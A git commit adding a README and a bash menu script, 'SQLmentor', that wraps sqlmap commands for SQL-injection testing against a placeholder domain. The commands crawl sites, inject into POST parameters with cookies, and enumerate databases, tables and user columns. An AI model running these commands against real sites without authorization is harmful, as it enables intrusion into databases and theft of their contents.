062d92c00a8442ada7bdd6de797d5648e16acb2b
psycolulz <112537894+psycolulz@users.noreply.github.com>
2022-10-13 15:06:25 -0400

    Add files via upload

---
+++ README.md
@@ -0,0 +1,30 @@
+Welcome To SQLmentor.
+I made this tool because when I first started I had heard a lot about SQLmap and people using it but didn't really understand
+how to use it.
+
+I started doing some actual research on how to use SQLmap and decided to make a tool to help others that do not really
+understand how to use it. Users will also have to learn how to read code, it will help them a lot in the future so some
+day they will hopefully be able to write their own tools and help others learn.
+
+HOW TO USE SQLMENTOR
+===========================
+Before Using The Tool And Any Of Its Options, Go Into The Code By Typing "nano sqlmentor.sh" in the terminal.
+Look through the code until you see a note that says the following:
+
+Do Not Forget To Replace The Default Domains
+
+You Will Need To Do That Each Time, As You Would If You Were Using SQLmap By Itself.
+
+
+HOW TO TELL IF IT WORKS
+===========================
+Telling if sql injection works on the website is easy, you will see actual results LOL
+SQLmap also tells you if the site is injectable or not, so it is rather easy.
+
+
+CLOSING NOTES
+================
+Much Love To Each And Every One Of You. I Hope You Have A Fantastic Day And That My Program Proves Useful To You
+In Your Pursuit Of Knowledge.
+
+Hack The Planet!!!
---
+++ sqlmentor.sh
@@ -0,0 +1,80 @@
+#!/bin/bash
+tput bold
+clear
+echo
+echo "Credit For SQLmap Goes To Its Developers, Not Me. I Just Created The Cheet Sheat"
+echo
+echo "  ██████   █████   ██▓     ███▄ ▄███▓▓█████  ███▄    █ ▄▄▄█████▓ ▒█████   ██▀███  
+▒██    ▒ ▒██▓  ██▒▓██▒    ▓██▒▀█▀ ██▒▓█   ▀  ██ ▀█   █ ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
+░ ▓██▄   ▒██▒  ██░▒██░    ▓██    ▓██░▒███   ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
+  ▒   ██▒░██  █▀ ░▒██░    ▒██    ▒██ ▒▓█  ▄ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  
+▒██████▒▒░▒███▒█▄ ░██████▒▒██▒   ░██▒░▒████▒▒██░   ▓██░  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒ @psycolulz
+▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
+░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░░  ░      ░ ░ ░  ░░ ░░   ░ ▒░    ░      ░ ▒ ▒░   ░▒ ░ ▒░  V. 1.0.0
+░  ░  ░     ░   ░   ░ ░   ░      ░      ░      ░   ░ ░   ░      ░ ░ ░ ▒    ░░   ░ 
+      ░      ░        ░  ░       ░      ░  ░         ░              ░ ░     ░     
+     "                                                                             
+echo
+echo " This Tool Is For Educational Purposes! Shoutout To The SQLmap Developers"
+echo 
+echo 
+PS3='root@sqlmentor~:'
+options=("1. SQL Crawling" "2. SQL Crawling + Forms" "3. SQL GET Req." "4. SQL POST Req." "5. SQL Auth Site" "6. Collect DB & User" "7. Sql & Tables" "8. SQL User Columns" "9. SQL mssql DB" "10. SQL mysql DB" "11. SQL oracle DB" "12. SQL postgres DB")
+select opt in "${options[@]}"
+do 
+case $opt in 
+"1. SQL Crawling")
+# Do Not Forget To Replace The Default Domains
+command clear
+command sqlmap -u https://enterdomainhere.com/ --crawl=2
+;;
+"2. SQL Crawling + Forms")
+command clear
+command sqlmap -u https://enterdomainhere.com/ --forms --crawl=2
+;;
+"3. SQL GET Req.")
+command clear
+command sqlmap -u https://enterdomainhere.com/
+;;
+"4. SQL POST Req.")
+command clear
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val"
+;;
+"5. SQL Auth Site")
+command clear
+command  sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --cookie="cookie1=val1;cookie2=val2"
+;;
+"6. Collect DB & User")
+command clear
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --current-db --current-user
+;;
+"7. SQL & Tables")
+command clear
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --tables -D "testdb"
+;;
+"8. SQL User Columns")
+command clear
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --columns -T "users"
+;;
+"9. SQL mssql DB")
+command clear
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mssql"
+;;
+"10. SQL mysql DB")
+command clear
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mysql"
+;;
+"11. SQL oracle DB")
+command clear
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="oracle"
+;;
+"12. SQL postgres DB")
+command clear
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="postgres"
+;;
+esac
+echo "Press Ctrl + C"
+done
+
+
+
